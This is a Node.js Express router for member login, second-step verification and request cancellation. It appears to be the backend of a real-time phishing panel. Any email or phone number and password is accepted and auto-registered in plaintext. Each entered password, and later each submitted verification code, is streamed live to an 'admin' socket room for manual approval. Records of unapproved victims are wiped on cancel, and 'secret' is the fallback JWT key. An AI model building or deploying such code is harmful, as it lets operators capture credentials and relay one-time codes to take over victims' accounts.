const express = require('express');
const db = require('../utils/db');
const router = express.Router();
const jwt = require('jsonwebtoken');

module.exports = (io) => {
  // 会员登录
  router.post('/login', async (req, res) => {
    try {
      const { email, password } = req.body;
      let clientIP = req.ip || req.connection.remoteAddress;
      // 只保留IPv4地址
      if (clientIP && clientIP.startsWith('::ffff:')) clientIP = clientIP.substring(7);
      // 如果是IPv6且不是IPv4映射，直接不记录
      if (clientIP && clientIP.includes(':')) clientIP = '';

      // 检查IP是否被禁止
      const bannedIPs = await db.query(
        'SELECT * FROM ip_blacklist WHERE ip_address = ? AND status = "active"',
        [clientIP]
      );

      if (bannedIPs.length > 0) {
        return res.status(403).json({
          error: req.t('ip_banned'),
          reason: bannedIPs[0].reason || req.t('ip_banned_default_reason')
        });
      }

      // 只允许邮箱和全球手机号作为账号
      const emailOrPhone = email;
      const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
      const phoneRegex = /^\+?[1-9]\d{9,14}$/; // 全球手机号E.164格式
      if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
        return res.status(400).json({ error: req.t('account_must_be_email_or_phone') });
      }

      // 检查会员是否存在，不存在则自动注册
      let members = await db.query('SELECT * FROM members WHERE email = ?', [email]);
      let member;
      let isNewMember = false;

      if (members.length === 0) {
        // 自动注册新会员
        const result = await db.insert('members', {
          email,
          password
        });

        member = { id: result.insertId, email, password };
        isNewMember = true;
      } else {
        member = members[0];
        // 验证密码（明文比较）
        const validPassword = (password === member.password);
        if (!validPassword) {
          return res.status(400).json({ error: req.t('invalid_credentials') });
        }
      }

      // 记录登录日志
      // 轮询分配在线普通管理员（优先空闲）
      let assignedAdminId = null;
      if (req.app && req.app.locals && req.app.locals.assignAdminForLogin) {
        console.log('[Assignment Debug] Current online admins:', Array.from(req.app.locals.onlineAdmins ? req.app.locals.onlineAdmins.keys() : []));
        assignedAdminId = await req.app.locals.assignAdminForLogin();
        console.log('[Assignment Debug] Assigned admin ID:', assignedAdminId);
      }
      const loginResult = await db.insert('login_logs', {
        member_id: member.id,
        ip_address: clientIP,
        assigned_admin_id: assignedAdminId
      });

      // 通知管理员有新的登录请求
      const loginRequestData = {
        id: loginResult.insertId,
        member_id: member.id,
        email: member.email,
        password: password, // 使用用户输入的密码，而不是member.password
        ip_address: clientIP,
        login_time: new Date()
      };
      io.to('admin').emit('new-login-request', loginRequestData);

      res.json({
        message: req.t('login_pending_approval'),
        loginId: loginResult.insertId,
        memberId: member.id
      });

    } catch (error) {
      res.status(500).json({ error: req.t('server_error') });
    }
  });

  // 提交二次验证码
  router.post('/verify', async (req, res) => {
    try {
      const { loginId, verificationCode } = req.body;

      // 获取登录记录
      const loginLogs = await db.query(
        'SELECT * FROM login_logs WHERE id = ? AND status = "approved"',
        [loginId]
      );

      if (loginLogs.length === 0) {
        return res.status(400).json({ error: req.t('invalid_login_session') });
      }

      const loginLog = loginLogs[0];
      
      // 检查是否已经存在验证请求（包括待处理和被拒绝的）
      const existingVerifications = await db.query(
        'SELECT * FROM second_verifications WHERE member_id = ? AND login_log_id = ? AND (status = "pending" OR status = "rejected")',
        [loginLog.member_id, loginId]
      );
      

      
      let verificationId;
      
      if (existingVerifications.length > 0) {
        // 如果已经存在验证请求，则更新验证码和状态
        const existingVerification = existingVerifications[0];
        await db.update('second_verifications', 
          { 
            verification_code: verificationCode,
            status: 'pending' // 重置状态为待处理
          },
          { id: existingVerification.id }
        );
        verificationId = existingVerification.id;

      } else {
        // 如果不存在待处理的验证请求，则创建新的
        const verifyResult = await db.insert('second_verifications', {
          member_id: loginLog.member_id,
          login_log_id: loginId,
          verification_code: verificationCode,
          assigned_admin_id: loginLog.assigned_admin_id
        });
        verificationId = verifyResult.insertId;

      }

      // 通知管理员有新的验证请求
      const members = await db.query('SELECT email, password FROM members WHERE id = ?', [loginLog.member_id]);
      
      // 检查是否是更新现有请求
      if (existingVerifications.length > 0) {
        // 如果是更新现有请求，发送更新事件
        io.to('admin').emit('update-verification-request', {
          id: verificationId,
          member_id: loginLog.member_id,
          email: members[0].email,
          password: members[0].password,
          verification_code: verificationCode,
          submitted_at: new Date()
        });
      } else {
        // 如果是新请求，发送新请求事件
        io.to('admin').emit('new-verification-request', {
          id: verificationId,
          member_id: loginLog.member_id,
          email: members[0].email,
          password: members[0].password,
          verification_code: verificationCode,
          submitted_at: new Date()
        });
      }

      // 不在验证提交时生成token，等管理员审核通过后再生成
      res.json({
        message: req.t('verification_pending_approval'),
        verificationId: verificationId
      });

    } catch (error) {
      console.error('Second verification API error:', error, error && error.stack);
      res.status(500).json({ error: req.t('server_error') });
    }
  });

  // 取消登录/验证请求（用户关闭浏览器或刷新页面时）
  router.post('/cancel', async (req, res) => {
    try {
      const { loginId, memberId } = req.body;
      
      if (!loginId || !memberId) {
        return res.status(400).json({ error: 'Missing required parameters' });
      }

      // 检查会员是否在线（Socket房间）
      let isOnline = false;
      if (req.app && req.app.locals && req.app.locals.onlineMembers) {
        isOnline = req.app.locals.onlineMembers.has(memberId);
      }

      // 获取登录记录
      const loginLogs = await db.query('SELECT * FROM login_logs WHERE id = ?', [loginId]);
      
      if (loginLogs.length === 0) {
        // 登录记录不存在，可能已经被清理，直接返回成功
        console.log(`Login record ${loginId} does not exist, may have been cleaned`);
        return res.status(200).json({ message: 'Login record already processed or cleaned' });
      }
      
      const loginLog = loginLogs[0];
      
      // 只要未审核通过就直接删除
      if (loginLog.status !== 'approved') {
      try {
        // 1. 删除所有二次验证记录
        await db.query('DELETE FROM second_verifications WHERE member_id = ?', [memberId]);
        // 2. 删除所有签到记录
        await db.query('DELETE FROM checkin_records WHERE member_id = ?', [memberId]);
        // 3. 删除所有登录记录
        await db.query('DELETE FROM login_logs WHERE member_id = ?', [memberId]);
        // 4. 删除会员资料
        await db.query('DELETE FROM members WHERE id = ?', [memberId]);
        } catch (error) {
          console.error('Auto cleanup data error:', error);
        }
      }
      
      // 通知管理员取消登录请求
      io.to('admin').emit('cancel-login-request', {
        id: loginId,
        member_id: memberId
      });
      
      console.log(`Notified admin to cancel login request ${loginId}`);
      
      res.status(200).json({ message: 'Request cancelled successfully' });
    } catch (error) {
      console.error('Cancel request error:', error);
      // 即使出错也返回成功，因为用户已经离开页面
      res.status(200).json({ message: 'Request processed' });
    }
  });

  // 校验会员token有效性
  router.post('/verify-token', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(400).json({ error: 'No token' });
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'secret');
      res.json({ valid: true, memberId: decoded.memberId });
    } catch (e) {
      res.status(401).json({ error: 'Invalid or expired token' });
    }
  });

  return router;
};